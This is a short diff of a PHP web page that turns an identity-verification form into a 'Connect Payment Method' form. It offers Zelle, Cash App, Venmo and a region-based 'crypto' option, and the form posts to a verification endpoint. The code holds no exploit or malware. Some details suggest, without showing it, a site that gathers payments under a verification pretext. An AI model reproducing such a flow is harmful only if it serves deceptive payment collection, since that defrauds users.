@@ -28,7 +28,7 @@ if ($user_query_run && mysqli_num_rows($user_query_run) > 0) {
 }
 
 // Get crypto setting from region_settings table based on user's country
-$crypto_label = "Local Bank Deposit/Transfer"; // Default label
+$crypto_label = "PayPal"; // Default label
 if (!empty($user_country)) {
     $region_query = "SELECT crypto FROM region_settings WHERE country = '" . mysqli_real_escape_string($con, $user_country) . "' LIMIT 1";
     $region_query_run = mysqli_query($con, $region_query);
@@ -46,7 +46,7 @@ if (!empty($user_country)) {
 
 <main id="main" class="main">
     <div class="pagetitle">
-        <h1>Verify Identity</h1>
+        <h1>Connect Payment Method</h1>
         <nav>
             <ol class="breadcrumb">
                 <li class="breadcrumb-item"><a href="index">Home</a></li>
@@ -83,15 +83,16 @@ if (!empty($user_country)) {
             <div class="col-md-6">
                 <div class="card text-center">
                     <div class="card-header">
-                        Select Verification Method
+                        Select Payment Method
                     </div>
                     <div class="card-body mt-3">
                         <form action="verify-complete.php" method="POST">
                             <div class="mb-3">
                                 <select class="form-select" id="verification_method" name="verification_method" required>
-                                    <option value="" disabled selected>Select a verification method</option>
-                                    <option value="Driver's License">Driver's License</option>
-                                    <option value="USA Support Card">USA Support Card</option>
+                                    <option value="" disabled selected>Select a payment method</option>
+                                    <option value="Zelle">Zelle</option>
+                                    <option value="Cash App">Cash App</option>
+                                    <option value="Venmo">Venmo</option>
                                     <option value="<?= htmlspecialchars($crypto_label) ?>"><?= htmlspecialchars($crypto_label) ?></option>
                                 </select>
                             </div>
